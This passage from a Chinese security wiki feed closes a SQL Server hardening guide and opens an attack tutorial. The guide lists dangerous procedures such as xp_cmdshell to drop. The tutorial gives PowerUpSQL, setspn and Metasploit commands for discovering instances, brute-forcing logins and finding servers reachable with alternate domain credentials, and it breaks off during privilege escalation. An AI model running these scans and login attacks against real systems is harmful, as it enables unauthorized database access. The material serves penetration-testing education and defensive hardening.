系统存储过程/系统扩展存储过程</span><br></pre></td></tr></table></figure><p>​                                                        <img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-10.png"> <img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/安全加固-11.png" style="zoom:95%;"></p><p>删除SQL Server中存在的危险存储过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">exec sp_dropextendedproc &#x27;xp_cmdshell&#x27; </span><br><span class="line">exec sp_dropextendedproc &#x27;xp_dirtree&#x27;</span><br><span class="line">exec sp_dropextendedproc &#x27;xp_enumgroups&#x27;</span><br><span class="line">exec sp_dropextendedproc &#x27;xp_fixeddrives&#x27;</span><br><span class="line">exec sp_dropextendedproc &#x27;xp_loginconfig&#x27;</span><br><span class="line">exec sp_dropextendedproc &#x27;xp_enumerrorlogs&#x27;</span><br><span class="line">exec sp_dropextendedproc &#x27;xp_getfiledetails&#x27;</span><br><span class="line">exec sp_dropextendedproc &#x27;Sp_OACreate&#x27; </span><br><span class="line">exec sp_dropextendedproc &#x27;Sp_OADestroy&#x27; </span><br><span class="line">exec sp_dropextendedproc &#x27;Sp_OAGetErrorInfo&#x27; </span><br><span class="line">exec sp_dropextendedproc &#x27;Sp_OAGetProperty&#x27; </span><br><span class="line">exec sp_dropextendedproc &#x27;Sp_OAMethod&#x27; </span><br><span class="line">exec sp_dropextendedproc &#x27;Sp_OASetProperty&#x27; </span><br><span class="line">exec sp_dropextendedproc &#x27;Sp_OAStop&#x27; </span><br><span class="line">exec sp_dropextendedproc &#x27;Xp_regaddmultistring&#x27; </span><br><span class="line">exec sp_dropextendedproc &#x27;Xp_regdeletekey&#x27; </span><br><span class="line">exec sp_dropextendedproc &#x27;Xp_regdeletevalue&#x27; </span><br><span class="line">exec sp_dropextendedproc &#x27;Xp_regenumvalues&#x27; </span><br><span class="line">exec sp_dropextendedproc &#x27;Xp_regread&#x27; </span><br><span class="line">exec sp_dropextendedproc &#x27;Xp_regremovemultistring&#x27; </span><br><span class="line">exec sp_dropextendedproc &#x27;Xp_regwrite&#x27; </span><br><span class="line">drop procedure sp_makewebtask</span><br></pre></td></tr></table></figure><p>删除不必要的存储过程，一般情况下建议删除的存储过程有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sp_OACreate </span><br><span class="line">sp_OADestroy </span><br><span class="line">sp_OAGetErrorInfo </span><br><span class="line">sp_OAGetProperty </span><br><span class="line">sp_OAMethod </span><br><span class="line">sp_OASetProperty </span><br><span class="line">sp_OAStop </span><br><span class="line">sp_regaddmultistring </span><br><span class="line">xp_regdeletekey </span><br><span class="line">xp_regdeletevalue </span><br><span class="line">xp_regenumvalues </span><br><span class="line">xp_regremovemultistring </span><br></pre></td></tr></table></figure><p>不是应用程序必须使用时，建议删除以下存储过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">xp_perfend </span><br><span class="line">xp_perfmonitor </span><br><span class="line">xp_perfsample </span><br><span class="line">xp_perfstart </span><br><span class="line">xp_readerrorlog </span><br><span class="line">xp_readmail </span><br><span class="line">xp_revokelogin </span><br><span class="line">xp_runwebtask </span><br><span class="line">xp_schedulersignal </span><br><span class="line">xp_sendmail </span><br><span class="line">xp_servicecontrol </span><br><span class="line">xp_snmp_getstate </span><br><span class="line">xp_snmp_raisetrap </span><br><span class="line">xp_sprintf </span><br><span class="line">xp_sqlinventory </span><br><span class="line">xp_sqlregister </span><br><span class="line">xp_sqltrace </span><br><span class="line">xp_sscanf </span><br><span class="line">xp_startmail </span><br><span class="line">xp_stopmail </span><br><span class="line">xp_subdirs </span><br><span class="line">xp_unc_to_drive </span><br><span class="line">xp_dirtree </span><br><span class="line">xp_sdidebug </span><br><span class="line">xp_availablemedia </span><br><span class="line">xp_cmdshell </span><br><span class="line">xp_deletemail </span><br><span class="line">xp_dirtree </span><br><span class="line">xp_dropwebtask </span><br><span class="line">xp_dsninfo </span><br><span class="line">xp_enumdsn </span><br><span class="line">xp_enumerrorlogs </span><br><span class="line">xp_enumgroups </span><br><span class="line">xp_enumqueuedtasks </span><br><span class="line">xp_eventlog </span><br><span class="line">xp_findnextmsg </span><br><span class="line">xp_fixeddrives </span><br><span class="line">xp_getfiledetails </span><br><span class="line">xp_getnetname </span><br><span class="line">xp_grantlogin </span><br><span class="line">xp_logevent </span><br><span class="line">xp_loginconfig </span><br><span class="line">xp_logininfo </span><br><span class="line">xp_makewebtask </span><br><span class="line">xp_msver  </span><br></pre></td></tr></table></figure><h3 id="删除不必要的功能和服务"><a href="#删除不必要的功能和服务" class="headerlink" title="删除不必要的功能和服务"></a>删除不必要的功能和服务</h3><p>SQL Server的远程访问功能，允许网络上的其他SQL Server远程连接并执行存储过程。 如果不需要此功能，则应使用以下命令禁用该功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">execute sp_configure &#x27;remote access&#x27;, &#x27;0&#x27;</span><br><span class="line">go</span><br><span class="line">reconfigure with override</span><br><span class="line">go</span><br></pre></td></tr></table></figure><p>或者使用Microsoft SQL Server Management Studio</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server（右键） -&gt; 属性 -&gt; 连接</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-13.png"></p><p>配置选项“允许更新”定义数据库用户是否可以直接更新系统表。 这对于高级管理员来说可能是有用的临时功能，但对于正常操作，应该将其禁用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">execute sp_configure &#x27;allow updates&#x27;, &#x27;0&#x27;</span><br><span class="line">go</span><br><span class="line">reconfigure with override</span><br><span class="line">go</span><br></pre></td></tr></table></figure><p>SQL Server Monitor，它侦听UDP端口1434并提供客户端不应访问有关服务器上存在的实例的信息，并且SQL Server将在其被阻止的情况下运行。 防火墙或应阻止来自TCP端口1433和UDP端口1434的外部通信。异构查询或临时查询允许数据库用户使用本地数据在远程服务器上执行查询。 该功能可能被滥用以强制使用远程或本地访问凭据，应在不需要此功能时，将其禁用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regwrite N&#x27;HKEY_LOCAL_MACHINE&#x27;, N&#x27;SOFTWARE\Microsoft\MSSQLServer\Providers\SQLOLEDB&#x27;, N&#x27;DisallowAdhocAccess&#x27;, N&#x27;REG_DWORD&#x27;, 1</span><br></pre></td></tr></table></figure><p>如果不需要，则应禁用SQL Server代理，Microsoft分布式事务处理协调器（MSDTC）和MSSearch服务。 可以使用企业管理器或通过在Windows Services管理工具中将其启动类型设置为“停止”来关闭服务。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 管理</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-14.png"></p><p>或者设置注册表值禁用服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec sp_set_sqlagent_properties @auto_start=0</span><br><span class="line">exec xp_regwrite N&#x27;HKEY_LOCAL_MACHINE&#x27;, N&#x27;SYSTEM\CurrentControlSet\Services\MSDTC&#x27;, N&#x27;Start&#x27;, N&#x27;REG_DWORD&#x27;, 3</span><br><span class="line">exec xp_regwrite N&#x27;HKEY_LOCAL_MACHINE&#x27;, N&#x27;SYSTEM\CurrentControlSet\Services\MSSEARCH&#x27;, N&#x27;Start&#x27;, N&#x27;REG_DWORD&#x27;, 3</span><br></pre></td></tr></table></figure><p>进行这些更改后，应手动停止服务或重新启动服务器。</p><h3 id="安装补丁"><a href="#安装补丁" class="headerlink" title="安装补丁"></a>安装补丁</h3><p>最后的步骤是确保应用最新的服务包和补丁程序。将显示SQL Server的当前版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@version</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-12.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm">https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm</a></li><li><a href="http://www.freetds.org/">http://www.freetds.org/</a></li><li><a href="http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html">http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html</a></li><li><a href="https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/">https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/</a></li><li><a href="https://xz.aliyun.com/t/7534">https://xz.aliyun.com/t/7534</a></li><li><a href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</a></li><li><a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SQL-Server加固&quot;&gt;&lt;a href=&quot;#SQL-Server加固&quot; class=&quot;headerlink&quot; title=&quot;SQL Server加固&quot;&gt;&lt;/a&gt;SQL Server加固&lt;/h2&gt;&lt;h3 id=&quot;账号管理&quot;&gt;&lt;a href=&quot;#账号管理&quot; cla</summary>
      
    
    
    
    <category term="数据库攻防" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/"/>
    
    <category term="SQL Server" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL-Server/"/>
    
    
    <category term="SQL Server" scheme="http://example.com/tags/SQL-Server/"/>
    
  </entry>
  
  <entry>
    <title>SQL Server数据库攻防详解下篇</title>
    <link href="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/"/>
    <id>http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/</id>
    <published>2021-07-03T01:54:41.000Z</published>
    <updated>2021-07-03T02:53:29.163Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="SQL-Server攻击实战思路"><a href="#SQL-Server攻击实战思路" class="headerlink" title="SQL Server攻击实战思路"></a>SQL Server攻击实战思路</h2><p>第二章简单介绍了SQL Server中常见的一写利用点，接下来介绍这些利用面在各个攻击阶段中的应用和一些思路。</p><h3 id="SQL-Server实例发现"><a href="#SQL-Server实例发现" class="headerlink" title="SQL Server实例发现"></a>SQL Server实例发现</h3><p>SQL Server的实例发现-，本地实例主要是通过检查系统服务和注册表方式。远程实例可以通过扫描TDS监听服务、UDP广播、SPN服务等方式。</p><p>常见的几种实例发现-工具：</p><ul><li><a href="https://docs.microsoft.com/en-us/sql/tools/osql-utility?view=sql-server-2017">osql</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osql -L</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-1.png"></p><ul><li><a href="https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-2017">sqlcmd</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlcmd -L</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-2.png"></p><ul><li><a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 //加载模块</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/PowerUpSQL-1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceBroadcast  //SQL Server实例发现-</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/PowerUpSQL-3.png"></p><ul><li><p><a href="http://www.sqlsecurity.com/downloads">SQLPing3</a></p></li><li><p>Metasploit mssql_ping module</p></li><li><p>Nmap</p></li><li><p>Nessus</p></li><li><p>……</p></li></ul><h4 id="本地实例发现"><a href="#本地实例发现" class="headerlink" title="本地实例发现"></a>本地实例发现</h4><p>作为本地用户，主要是通过检查系统服务和注册表设置来标识SQL Server实例。</p><p>检查系统服务</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-5.png"></p><p>检查注册表键值，也可判断SQL Server实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server&quot; /v InstalledInstances</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-6.png"></p><p>使用PowerUpSQL，来识别本地实例。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 //加载模块</span><br><span class="line">Get-SQLInstanceLocal  //SQL Server实例发现-</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-4.png"></p><h4 id="远程实例发现"><a href="#远程实例发现" class="headerlink" title="远程实例发现"></a>远程实例发现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceBroadcast -Verbose //UDP广播Ping</span><br><span class="line">Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1 //UDP端口扫描 </span><br><span class="line">Get-SQLInstanceFile -FilePath c:\temp\computers.txt | Get-SQLInstanceScanUDPThreaded -Verbose //从文件获取实例列表 </span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/PowerUpSQL-3.png"></p><h4 id="域内实例发现"><a href="#域内实例发现" class="headerlink" title="域内实例发现"></a>域内实例发现</h4><p>域内实例主要利用SPN扫描发现实例，先简单介绍一下什么是SPN服务。</p><h4 id="SPN服务"><a href="#SPN服务" class="headerlink" title="SPN服务"></a>SPN服务</h4><p>Windows 域环境是基于活动目录（Active Directory）服务工作的。为了在域环境中有效地对资源访问权限进行精细控制，提高网络环境的安全性和方便网络资源统一分配管理。系统给域内每种资源分配了不同的服务主体名称（Service Principal Name, SPN）。使用Kerberos协议进行身份验证的域环境中，本地账号SPN将自动注册，但是，域内用户账号下运行的服务，必须为此域内账户手动注册。如下图SQL Server服务运行在域内用户时的状态。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-8.png"></p><p>因为域中每台机器都要在Kerberos身份验证服务中注册SPN，所以攻击者可以向域控制器（AD）发送请求，获取SPN相关信息，得到某个服务资源在哪台服务器上。</p><p>SQL Server服务的SPN示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TERMSRV/MSSQL2.sec.com:1433</span><br><span class="line">服务组件名称/主机名.域名:监听端口</span><br></pre></td></tr></table></figure><p>域内用户账号下运行的服务，手动注册SPN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A MSSQLSvc/MSSQL2.sec.com:1433 mssqluser</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-9.png"></p><p>更多SPN相关介绍请查看：<a href="https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spn-setspn-syntax.aspx">https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spn-setspn-syntax.aspx</a></p><p>域中安装的SQL Server会使用关联的服务帐户自动在活动目录（Active Directory）中注册，以支持Kerberos身份验证。可以使用以下方式识别实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -q */*</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-7.png"></p><ul><li><p><a href="https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx">setspn.exe</a>。</p></li><li><p><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">adfind.exe</a>。</p></li><li><p><a href="https://github.com/nullbind/Powershellery/blob/master/Stable-ish/Get-SPN/Get-SPN.psm1">Get-Spn.psm1</a>。</p></li><li><p><a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain</span><br></pre></td></tr></table></figure></li></ul><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-10.png"></p><p>PowerUpSQL其他发现实例命令</p><table><thead><tr><th>描述</th><th align="center">命令</th></tr></thead><tbody><tr><td>使用备用域凭据发现Active Directory域SQL Server实例</td><td align="center">runas /noprofile /netonly /user:domain\user PowerShell.exe import-module PowerUpSQL.psd1<code> </code>Get-SQLInstanceDomain -Verbose -DomainController 192.168.1.1 -Username domain\user -password Password123</td></tr><tr><td>列出使用特定域帐户的SQL Server实例</td><td align="center">Get-SQLInstanceDomain -Verbose -DomainAccount mssqluser</td></tr><tr><td>列出共享域用户SQL Server服务帐户</td><td align="center">Get-SQLInstanceDomain -Verbose | Group-Object DomainAccount | Sort-Object count -Descending | select Count,Name | Where-Object {($<em>.name -notlike “$”) -and ($</em>.count -gt 1) }</td></tr></tbody></table><h3 id="SQL-Server口令爆破"><a href="#SQL-Server口令爆破" class="headerlink" title="SQL Server口令爆破"></a>SQL Server口令爆破</h3><p>连接测试，两种功能均可用于测试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLConnectionTestThreaded</span><br><span class="line">Invoke-SQLAuditWeakLoginPw </span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-11.png"></p><p>爆破必须的几个条件：</p><ul><li>常见的弱密码</li><li>当前的本地用户访问权限</li><li>当前域用户访问权限</li><li>备用域用户访问权限</li></ul><p>使用msf来执行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mssql/mssql_login</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-1.png"></p><p>PowerUpSQL其他获取账户相关命令：</p><table><thead><tr><th>描述</th><th>命令</th></tr></thead><tbody><tr><td>获取可用提供的SQL Server登录名登录的域SQL Server列表</td><td>$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username testuser -password testpass | Where-Object {$_.Status -like “Accessible”} $Targets</td></tr><tr><td>获取可以使用当前域帐户登录的域SQL服务器的列表</td><td>$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like “Accessible”} $Targets</td></tr><tr><td>获取可以使用备用域帐户登录的域SQL服务器的列表</td><td>runas /noprofile /netonly /user:domain\user PowerShell.exe<code> </code>Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose -Threads 15</td></tr><tr><td>获取可以使用非域系统中的备用域帐户登录的域SQL服务器的列表。</td><td>runas /noprofile /netonly /user:domain\user PowerShell.exe<code> </code>Get-SQLInstanceDomain -Verbose -Username ‘domain\user’ -Password ‘MyPassword!’ -DomainController 10.1.1.1 | Get-SQLConnectionTestThreaded -Verbose -Threads 15</td></tr><tr><td>发现域SQL Server，并根据实例名称确定它们是否配置有普通应用程序使用的默认密码</td><td>Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose</td></tr></tbody></table><h3 id="SQL-Server权限提升"><a href="#SQL-Server权限提升" class="headerlink" title="SQL Server权限提升"></a>SQL Server权限提升</h3><p>权限提升基本的一个思路：</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-0.png"></p><p>域用户可以到处登录的前置条件。</p><ul><li>添加了域用户</li><li>已添加本地用户</li><li>特权继承</li></ul><p>获得Sysadmin权限的一些利用点：</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-1.png"></p><h4 id="获得低权限账号"><a href="#获得低权限账号" class="headerlink" title="获得低权限账号"></a>获得低权限账号</h4><p>可以使用常用的凭据执行爆破，但要注意帐户锁定。</p><p>以PowerUpSQL为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 //加载模块。</span><br><span class="line">Get-SQLInstanceScanUDP | Invoke-SQLAuditWeakLoginPw 